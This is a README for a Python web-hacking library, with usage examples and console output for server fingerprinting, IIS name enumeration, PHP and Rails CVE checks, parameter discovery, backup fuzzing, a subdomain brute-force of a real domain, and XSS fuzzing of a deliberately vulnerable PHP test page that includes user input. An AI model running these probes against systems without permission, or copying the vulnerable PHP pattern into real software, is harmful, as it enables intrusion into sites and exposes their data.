libpywebhack
============

A class with a plenty of useful instruments for web application analysis.
See libpywebhack.html for pydoc-generated documentation.

#Installation
Run `$ python setup.py install` or just put your scripts in the same directory.

#License
Creative Commons Attribution Non-Commercial Share Alike

#Key features
* Detecting a web-server, platform, links, some sensitive files (method `softdetect`)
    * Apache, NginX, MS IIS
    * PHP, ASP.NET, Django, Ruby on Rails, Java
* Once the platform is detected, you can test some specific vulnerabilities
    * Try to get real path under Apache mod_rewrite (via 413 error) or mod_negotiation, check for server-status (method `apachetest`)
    * Check for access restriction bypass via index_allocation possibility in IIS, check for some sensitive files, run `iiscan` (method `iistest`)
    * Try to fuzz all file names in current IIS directory via wildcards (method `iiscan`)
    * Check for CVE-2012-1823, PHP-FPM misconfiguration, try to get full path disclosure via sending an incorrect PHPSESSID or a file with very long name or a big nested array (method `phptest`)
    * Try to get ASP.NET version, check for some sensitive files, run `iiscan` (method `asptest`)
    * Check for CVE-2013-0156, try to get RoR project name (method `rubytest`)
* Also there're web-hacking methods common for various platforms
    * Try to find all GET-, POST- or Cookie-parameters of the web application scenario (method `argsfind`)
    * Check if there're some source code backups of the scenario left in the public access (method `fuzzbackups`)
    * Try to find the subdomains of the current host (method `brutesubs`. It's multi-threaded, a thread-method is `dobrute`)
    * Check if the javascript source code matches the DOM XSS regexps by .mario (method `domxsstest`)
    * Try to find the vulnerabilities in the known parameters of web application by sending some universal payloads (method `minifuzz`)

#Examples of usage
* Let's try something with ASP.NET site
    * Put the following into test.py
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='some_host', ssl=1)
        a.iistest('/')
    ```
    * Run and get the result
    ```
        $ python test.py
        ==========
        Testing for specific Microsoft-IIS issues
        Checking for /WEB-INF...
        Checking for /META-INF...
        Checking for /_vti_bin...
        Testing for IIS+PHP/ASP auth bypass through NTFS
        ==========
        Trying to retrieve content of the current IIS directory
        IIS 6 possibly detected
        (Part of some file or directory name: /a)
        (Part of some file or directory name: /as)
        (Part of some file or directory name: /asp)
        (Part of some file or directory name: /aspn)
        (Part of some file or directory name: /aspne)
        (Part of some file or directory name: /aspnet)
        ==========
        Found short names in /:
        aspnet~1
        ==========
        Testing specific ASP.NET issues
        Checking for /Trace.axd...
        Checking for /elmah.axd...
        Checking for /ScriptResource.axd?d=A...
        Checking for /WebResource.axd?d=A...
        ==========
        279 requests made
    ```
    * Well, almost nothing sensible at this server, but at least ASPNET~1 is a short name for the default aspnet_client directory. So, it works.
* What do you do, when you see a WEB2.0 web site? I run libpywebhack! Take the task http://ahack.ru/contest/?act=tmng as an example.
    * Let's get some info first
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='ahack.ru')
        a.softdetect('/contest/tinymanager/')
    ```
    * Run it and get the information
    ```
        $ python test.py
        ==========
        Retrieving information from /contest/tinymanager/
        Response code: 200
        Detected server: Apache/2.2.22 (FreeBSD) PHP/5.3.10 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8y
        Powered by: PHP/5.3.10
        Headers influencing Caching: None
        Powered by CMS: None
        Content Location: None
        ==========
        Checking for /sitemap.xml...
        Checking for /robots.txt...
        Possibly (code 200) found at http://ahack.ru/robots.txt
        Checking for /crossdomain.xml...
        Checking for /clientaccesspolicy.xml...
        Checking for /phpmyadmin...
        Checking for /pma...
        Checking for /myadmin...
        Checking for /.svn...
        Checking for /.ssh...
        Checking for /.git...
        Checking for /CVS...
        Checking for /info.php...
        Checking for /phpinfo.php...
        Checking for /test.php...
        Apache server detected
        PHP detected
        ==========
        15 requests made
    ```
    * So, it's apache. Let's get the real script name under the rewrite first
    ```
        $ python test.py
        ==========
        Testing specific Apache issues
        Trying to get real application name via invalid request...
        Found real path: /contest/tinymanager/flag_10_87c0__<nope, get the flag yourself :P>__e66c.php
        Checking for server status application...
        ==========
        3 requests made
    ```
    * Got it (I removed the flag from above). What's the next step in rewrited app hacking? Get the parameters. Take another task as an example: http://ahack.ru/contest/?act=teaser
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='ahack.ru') #may use a = WebHack(host='ahack.ru', cut = 'uncache_\w+')
        a.cut = 'uncache_\w+' #Remove the dynamic content from all responses (can be ads banner or something)
        a.argsfind('/contest/teaser/', modes=['get','post','cookie'])
    ```
    * Run and get the parameter name
    ```
        $ python test.py
        ==========
        Searching for the ['get', 'post', 'cookie']-parameters of /contest/teaser/
        1300 items loaded from the base
        Detecting the default page length and HTTP-code...
        ==========
        Starting dichotomy for GET-params...
        ==========
        .Too big base, splitting...
        .*..*..*.*.*.*..*..*..*..*.....
        ==========
        Found parameters: debug
        ==========
        Starting dichotomy for POST-params...
        ==========
        ..
        ==========
        Found parameters:
        ==========
        Starting dichotomy for COOKIE-params...
        ==========
        .Too big base, splitting...
        ...
        ==========
        Found parameters:
        ==========
        29 requests made
    ```
    * Ok, we've removed dynamic part of the page to detect abnormal responses and got a parameter name 'debug'. but what if there's no Apache, or the technique with 413 error does not work? Consider the same task
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='ahack.ru', ajax=1) #ajax attribute indicates the usage of 'X-Requested-With: XMLHttpRequest' header
        #a.ajax = 1 #Possible also this way
        a.argsfind('/contest/teaser/do_generate_samples', modes=['get','post','cookie']) #First find the parameters
        a.phptest('/contest/teaser/do_generate_samples') #Now perform some fuzzing using the found parameters
    ```
    * Run, wait a bit and get the result
    ```
        $ python test.py
        ==========
        Searching for the ['get', 'post', 'cookie']-parameters of /contest/teaser/do_generate_samples
        1300 items loaded from the base
        Detecting the default page length and HTTP-code...
        ==========
        Starting dichotomy for GET-params...
        ==========
        .Too big base, splitting...
        ...
        ==========
        Found parameters:
        ==========
        Starting dichotomy for POST-params...
        ==========
        .*..*..*.*.*..*..*.*.*.*..*......
        ==========
        Found parameters: limit
        ==========
        Starting dichotomy for COOKIE-params...
        ==========
        .Too big base, splitting...
        ...
        ==========
        Found parameters:
        ==========
        Testing specific PHP issues
        Testing for CVE-2012-1823...
        Not vulnerable
        Testing for common PHP-(Fast)CGI+NginX|IIS|Apache|LightHTTPD|(.*?) configuration vulnerability...
        Not vulnerable
        Trying to get an error sending invalid session id...
        Failed
        Trying to get a max_execution_time error by sending a file with long name...
        It can take time, wait...
        Failed
        Trying to get a type error or a max_execution_time error by exceeding memory_limit...
        Considering max_input_nesting_level = 64...
        It can take time, wait...
        Found server application path: /usr/local/www/ahack.ru/contest/teaser/flag_34_e918__<nope, get the flag yourself :P>__2557.php
        ==========
        38 requests made
    ```
    * Won again (and flag removed again)!
* Now move on to the general web-hacking.
    * Let's find subdomains of yandex.ru. Its DNS uses wildcards, so, we should bypass them. Using the regexp '404' is quite sufficient
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='yandex.ru')
        a.brutesubs(threads=8, ban_regex='404') #ignore all subdomains whose HTTP response contains string '404'
    ```
    * Run, get the subdomains
    ```
        $ python test.py
        ==========
        Searching for the subdomains of yandex.ru
        1904 names loaded. Starting 8 threads
        Found: mail.yandex.ru
        Found: mail2.yandex.ru
        Found: guest.yandex.ru
        Found: help.yandex.ru
        .....................  (output removed, run it yourself :P)
        Found: site.yandex.ru
        Found: warehouse.yandex.ru
        Found: epsilon.yandex.ru
        Found: webmail.yandex.ru
        1000 names proceeded
        Found: imap.yandex.ru
        Found: img.yandex.ru
        Found: dallas.yandex.ru
        Found: blackberry.yandex.ru
        .......................
        Found: old.yandex.ru
        Found: online.yandex.ru
        Found: orange.yandex.ru
        Found: ov.yandex.ru
        ==========
        1600 requests made
    ```
    * Good enough, what about fuzzing? Let's consider the following PHP code
    ```php
        <?
        echo $_GET['id'];
        echo $_POST['page'];
        echo $_COOKIE['name'];
        include $_GET['page'];
    ```
    * Write the following code
    ```python
        from libpywebhack import WebHack

        a = WebHack(host='localhost')
        a.argsfind('/scan.php')
        a.fuzzbackups('/scan.php')
        a.minifuzz('/scan.php')
    ```
    * Get the result in half a second:
    ```
        $ python test.py
        ==========
        Searching for the ['get']-parameters of /scan.php
        1300 items loaded from the base
        Detecting the default page length and HTTP-code...
        ==========
        Starting dichotomy for GET-params...
        ==========
        .Too big base, splitting...
        .*.*.*..*.*.*..*.*..*..*..*..*.*.*.*........
        ==========
        Found parameters: id,page
        ==========
        Searching for the back-ups of /scan.php
        Checking for generic backups...
        Checking for generic backups...
        Checking for generic backups...
        Checking for Vim swap files...
        Checking for Vim swap files...
        Checking for Vim swap files...
        Checking for Vim, Gedit temporary file...
        Possibly (code 200) found at http://localhost//scan.php~
        Checking for Windows or MacOS copies of the file...
        Checking for Windows or MacOS copies of the file...
        Checking for Emacs temporary file...
        Checking for GNU Nano temporary files...
        Checking for GNU Nano temporary files...
        Checking for MCEdit temporary files...
        Checking for Deleted files...
        Checking for (PHP) source code...
        ==========
        Fuzzing GET-parameters
        Found XSS. Payload: id=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00&page=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00/scan.php
        Found XSS. Payload: id=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00&page=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00/scan.php
        Found PHP Error. Payload: id=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00&page=%3Chok%3E%27%22koh%5C+%0D%0Atest%3Atset%3B%26%00/scan.php
        ==========
        47 requests made
    ```